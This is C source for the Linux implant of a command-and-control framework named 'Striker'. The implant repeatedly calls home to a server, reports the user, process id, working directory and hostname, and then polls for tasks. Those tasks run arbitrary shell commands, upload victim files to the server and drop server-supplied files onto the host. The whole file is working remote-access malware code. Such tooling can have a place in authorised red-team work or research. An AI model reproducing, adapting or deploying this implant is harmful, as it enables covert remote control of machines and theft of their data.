/**
 *------------------------------------
 * Striker C2 implant for linux hosts.
 *                  Author: Umar Abdul
 *------------------------------------
 */

#include "striker.h"

CURL *init_curl(const char *path, buffer *buff){
  
  CURL *curl = curl_easy_init();
  if (!curl){
    if (STRIKER_DEBUG)
      fprintf(stderr, "[-] Error initializing curl!\n");
    exit(EXIT_FAILURE);
  }
  char *url = malloc(URL_SIZE);
  snprintf(url, URL_SIZE, "%s%s", baseURL, path);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, buff);
  return curl;
}

size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){

  size_t chunk_size = size * nmemb;
  append_buffer(buff, chunk, chunk_size);
  return chunk_size; // This tells curl that we received all bytes.
}

size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo){
  return fwrite(chunk, size, nmemb, wfo);
}

cJSON *sysinfo(){

  cJSON *info = cJSON_CreateObject();
  char *user = getenv("USER");
  unsigned short pid = getpid();
  char *cwd = malloc(PATH_MAX);
  getcwd(cwd, PATH_MAX);
  char *os = "linux";
  char *host = malloc(100);
  gethostname(host, 99);
  cJSON_AddItemToObject(info, "user", cJSON_CreateString(user));
  cJSON_AddItemToObject(info, "pid", cJSON_CreateNumber(pid));
  cJSON_AddItemToObject(info, "cwd", cJSON_CreateString(cwd));
  cJSON_AddItemToObject(info, "os", cJSON_CreateString(os));
  cJSON_AddItemToObject(info, "host", cJSON_CreateString(host));
  free(cwd);
  free(host);
  return info;
}

task *parse_task(cJSON *json){

  task *t = malloc(sizeof(task));
  t->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, "uid"));
  t->type = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(json, "taskType"));
  t->data = cJSON_GetObjectItemCaseSensitive(json, "data");
  t->completed = 0;
  t->result = NULL;
  return t;
}

short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){

  CURL *curl = curl_easy_init();
  if (!curl)
    return 0;
  CURLcode res;
  curl_mime *form;
  curl_mimepart *field;
  buffer *body = create_buffer(0);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  form = curl_mime_init(curl);
  field = curl_mime_addpart(form);
  curl_mime_name(field, "file");
  curl_mime_filedata(field, filename);
  field = curl_mime_addpart(form);
  curl_mime_name(field, "filename");
  curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
  curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
  res = curl_easy_perform(curl);
  free_buffer(body);
  curl_mime_free(form);
  curl_easy_cleanup(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  return 1;
}

short int download_file(char *url, FILE *wfo, buffer *result_buff){

  CURL *curl = curl_easy_init();
  if (!curl)
    return 0;
  CURLcode res;
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
  res = curl_easy_perform(curl);
  if (res != CURLE_OK){
    buffer_strcpy(result_buff, curl_easy_strerror(res));
    return 0;
  }
  buffer_strcpy(result_buff, "File uploaded successfully!");
  return 1;
}

void execute_task(session *striker, task *tsk){

  if (STRIKER_DEBUG)
    printf("[*] Executing task: %s\n", tsk->uid);
  cJSON *data = tsk->data;
  cJSON *result = cJSON_CreateObject();
  buffer *result_buff = create_buffer(0);
  if (!strcmp(tsk->type, "system")){ // Run a shell command.
    char *cmd = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "cmd"));
    if (!cmd)
      goto complete;
    char *shell_cmd = malloc(sizeof(char) * 1024);
    snprintf(shell_cmd, sizeof(char) * 1024, "%s 2>&1", cmd);
    FILE *proc = popen(shell_cmd, "r");
    if (!proc){
      free(shell_cmd);
      goto complete;
    }
    const short chunk_size = 1024;
    char *tmp = malloc(sizeof(char) * chunk_size);
    while (result_buff->used < MAX_RES_SIZE){
      if (fgets(tmp, chunk_size, proc) == NULL)
        break;
      append_buffer(result_buff, tmp, strlen(tmp));
    }
    pclose(proc);
  }else if (!strcmp(tsk->type, "download")){ // Upload a file to the server.
    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
    FILE *rfo = fopen(filename, "r");
    if (!rfo){
      buffer_strcpy(result_buff, "Error opening file!");
      goto complete;
    }
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s", baseURL, striker->uid) < 0)
      abort();
    upload_file(url, filename, rfo, result_buff);
    fclose(rfo);
    free(url);
  }else if (!strcmp(tsk->type, "upload")){ // Download a file from the server.
    char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "fileID"));
    char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "name"));
    char *url = malloc(URL_SIZE);
    if (snprintf(url, URL_SIZE, "%s/agent/download/%s", baseURL, fileID) < 0)
      abort();
    char *loc = malloc(PATH_MAX);
    if (snprintf(loc, PATH_MAX, "%s%s", striker->write_dir, name) < 0)
      abort();
    FILE *wfo = fopen(loc, "w");
    if (wfo != NULL)
      download_file(url, wfo, result_buff);
    fclose(wfo);
    free(url);
    free(loc);
  }else if (!strcmp(tsk->type, "writedir")){
    char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dir"));
    int len = strlen(dir);
    if (dir[len - 1] != '/'){
      dir[len] = '/';
      dir[len + 1] = '\0';
    }
    strncpy(striker->write_dir, dir, PATH_MAX);
    buffer_strcpy(result_buff, "Changed write directory");
  }else{
    buffer_strcpy(result_buff, "Not implemented!");
  }

  complete:
    if (STRIKER_DEBUG)
      printf("[+] Task completed: %s\n", tsk->uid);
    tsk->completed = 1;
    char *res = buffer_to_string(result_buff);
    cJSON_AddItemToObject(result, "uid", cJSON_CreateString(tsk->uid));
    cJSON_AddItemToObject(result, "result", cJSON_CreateString(res));
    tsk->result = result;
    free_buffer(result_buff);
}

void start_session(){  
  
  // Default session setup.
  session *striker = malloc(sizeof(session));
  striker->uid = malloc(sizeof(char) * 32);
  striker->delay = 5;
  striker->write_dir = malloc(PATH_MAX);
  strncpy(striker->write_dir, "/tmp", PATH_MAX);

  CURL *curl;
  CURLcode res;
  // Build the common headers that will be used for GET and POST requests.
  struct curl_slist *get_headers = NULL, *post_headers = NULL;
  get_headers = curl_slist_append(get_headers, "Connection: close");
  post_headers = curl_slist_append(post_headers, "Connction: close");
  post_headers = curl_slist_append(post_headers, "Content-Type: application/json");
  buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
  
  while (1){ // Initiation loop.
    curl = init_curl("/agent/init", body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, cJSON_PrintUnformatted(sysinfo()));
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
      sleep(striker->delay);
      continue;
    }
    break;
  }

  cJSON *config = cJSON_Parse(buffer_to_string(body));
  if (!config){
    if (STRIKER_DEBUG){
      const char *error = cJSON_GetErrorPtr();
      fprintf(stderr, "[-] Error parsing config: %s\n", error);
    }
    goto end;
  }
  striker->uid = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, "uid"));
  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, "delay"));
  char *tasksURL = malloc(URL_SIZE);
  snprintf(tasksURL, URL_SIZE, "/agent/tasks/%s", striker->uid);
  printf("%s\n", cJSON_PrintUnformatted(config));
  while (1){
    resize_buffer(body, 0);
    sleep(striker->delay);
    // Fetch tasks.
    curl = init_curl(tasksURL, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, get_headers);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    if (res != CURLE_OK){
      if (STRIKER_DEBUG)
        fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
      continue;
    }
    // Parse and execute the tasks.
    cJSON *tasksJSON = cJSON_Parse(buffer_to_string(body));
    size_t tasksLen = cJSON_GetArraySize(tasksJSON);
    cJSON *results = cJSON_CreateArray();
    for (int i = 0; i < tasksLen; i++){
      task *tsk = parse_task(cJSON_GetArrayItem(tasksJSON, i));
      if (!tsk)
        continue;
      execute_task(striker, tsk);
      if (tsk->completed && tsk->result != NULL)
        cJSON_AddItemToArray(results, tsk->result);
    }
    // Send results.
    if (cJSON_GetArraySize(results) > 0){
      char *result = cJSON_PrintUnformatted(results);
      if (STRIKER_DEBUG)
        printf("[+] Task results: %s\n", result);
      while (1){
        resize_buffer(body, 0);
        curl = init_curl(tasksURL, body);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, post_headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, result);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if (res != CURLE_OK){
          if (STRIKER_DEBUG)
            fprintf(stderr, "[-] Error calling home: %s\n", curl_easy_strerror(res));
          sleep(striker->delay);
          continue;
        }
        break;
      }
    }
    // Cleanup.
    cJSON_Delete(results);
    cJSON_Delete(tasksJSON);
  }

  free(tasksURL);

  end:
    curl_slist_free_all(get_headers);
    curl_slist_free_all(post_headers);
    free_buffer(body);
    cleanup_session(striker);
}

void cleanup_session(session *striker){

  free(striker->uid);
  free(striker->write_dir);
  free(striker);
}

int main(int argc, char **argv){
  
  start_session();
  return 0;  
}
